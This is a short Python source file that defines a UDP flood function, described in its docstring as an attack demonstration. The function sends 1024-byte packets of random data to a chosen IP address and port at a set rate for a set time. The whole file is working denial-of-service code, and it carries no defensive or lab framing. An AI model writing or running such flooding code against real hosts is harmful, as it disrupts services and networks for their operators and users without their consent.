import socket
import time
import random

def udp_flood(target_ip, target_port, duration, rate):
    """
    UDP Flood attack demonstration.
    Continuously sends random data to the target via UDP.
    """
    print(f"[INFO] Starting UDP flood on {target_ip}:{target_port} for {duration} seconds at ~{rate} pkts/sec.")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    data = random._urandom(1024)  # Payload of 1024 bytes
    start_time = time.time()
    packet_count = 0

    while True:
        current_time = time.time()
        if current_time - start_time > duration:
            break
        
        sock.sendto(data, (target_ip, target_port))
        packet_count += 1

        time.sleep(1 / rate)

    sock.close()
    print(f"[INFO] UDP flood completed. Total packets sent: {packet_count}")
